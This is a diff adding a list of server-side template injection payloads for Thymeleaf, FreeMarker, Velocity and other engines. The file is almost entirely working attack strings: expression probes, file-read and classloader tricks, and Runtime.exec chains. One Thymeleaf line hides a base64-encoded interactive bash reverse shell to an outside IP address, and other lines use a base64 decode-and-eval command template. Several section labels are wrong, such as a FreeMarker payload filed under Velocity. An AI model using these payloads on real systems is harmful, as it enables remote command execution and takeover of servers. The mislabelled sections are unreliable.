@@ -1,0 +1,42 @@
+# Thymeleaf
+<p th:text="${#ctx}"></p>
+<p th:text="${#locale}"></p>
+<p th:text="${application.size()}"></p>
+<p th:text="${application.containsKey('foo')}"></p>
+<p th:text="${#request.getRequestName()}"></p>
+<p th:text="${#session.id}"></p>
+<p th:text="${#execInfo.templateName}"></p>
+<p th:text="${#execInfo.templateMode}"></p>
+<p th:text="${#messages.listMsg(messageKeyList)}"></p>
+<p th:text="${#conversions.convert(1519143196021, 'dd/MMM/yyyy HH:mm')}"></p>
+<p th:text="${Runtime.getRuntime()}"></p>
+<p th:text="${1+1}"></p>
+<p th:text=\"${#ctx.getClass().getClass()}\"></p>
+<p th:text=\"${#ctx.getClass().getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMTU2LjE4OC4xMzQvOTAwMCAwPiYxIA==}|{base64,-d}|{bash,-i}&quot;).toString()}\"></p>
+
+# FreeMarker
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls") }
+<#assign ex="x"><#assign ex="y"> ${ ex }
+#set($engine="")
+#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {eval,$({tr,/+,_-}<<<%s|{base64,--decode})}"))
+#set($null=$proc.waitFor())
+${null}
+<#assign proc=Runtime> ${ proc }
+
+# basic
+${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+
+# Groovy
+<%= 7 * 7 %>
+
+# Velocity
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls") }
+#set($x=1+1)${x}
+#set($engine="")
+#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {eval,$({tr,/+,_-}<<<%s|{base64,--decode})}"))
+#set($null=$proc.waitFor())
+${null}
